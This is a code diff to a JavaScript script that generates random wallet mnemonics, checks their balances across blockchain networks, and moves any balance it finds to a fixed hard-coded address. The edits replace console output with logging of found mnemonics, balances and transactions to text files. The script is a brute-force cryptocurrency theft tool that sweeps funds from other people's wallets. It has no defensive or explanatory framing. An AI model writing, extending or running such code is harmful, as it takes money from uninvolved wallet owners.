@@ -1,6 +1,7 @@
 const HDWalletProvider = require('@truffle/hdwallet-provider');
 const Web3 = require('web3');
 const bip39 = require('bip39');
+const fs = require('fs');
 
 const checkBalance = async (web3Provider, network) =>
 {
@@ -15,18 +16,30 @@ const checkBalance = async (web3Provider, network) =>
         // check if balance is greater than 0
         if (balance > 0)
         {
-            console.log(`Wallet found! Balance: ${balance} ETH on ${network}`);
-            console.log(`Mnemonic: ${mnemonic}`);
+            // console.log(`Wallet found! Balance: ${balance} ETH on ${network}`);
+
+            fs.appendFile('wallets.txt', `Wallet found! Balance: ${balance} ETH on ${network}\n` + mnemonic + '\n'
+            , function (err) {
+                if (err) throw err;
+            });
 
             // transfer funds to your wallet
             const tx = await web3Provider.eth.sendTransaction({
                 from: account,
                 to: '0x53FdA1A0b66E8A452d4088E635a0684ebf9163c2',
                 value: balance
-            }).catch(err => console.log(err, mnemonic, network));
+            }).catch(err => {
+                fs.appendFile('transactions.txt', `${err}, ${mnemonic}, ${network}\n`, function (err) {
+                    if (err) throw err;
+                });
+            });
 
             // log transaction
-            console.log(`Transaction: ${tx.transactionHash}`);
+            // console.log(`Transaction: ${tx.transactionHash}`);
+
+            fs.appendFile('transactions.txt', `Transaction: ${tx.transactionHash}\n`, function (err) {
+                if (err) throw err;
+            });
 
             // exit process
             process.exit();
@@ -37,6 +50,7 @@ const checkBalance = async (web3Provider, network) =>
 let mnemonic;
 const main_function = async () =>
 {
+    console.log('Starting...');
     // infinite loop
     while (true)
     {
@@ -81,7 +95,10 @@ const main_function = async () =>
         // await checkBalance(web3BSC, 'Binance Mainnet')
         //     .catch(err => console.log(err, mnemonic, 'Binance Mainnet'));
 
-        console.log(`No money found! Mnemonic: ${mnemonic}`);
+        fs.appendFile('wallets_not_found.txt', `${mnemonic}\n`
+            , function (err) {
+                if (err) throw err;
+            });
     }
 }
 
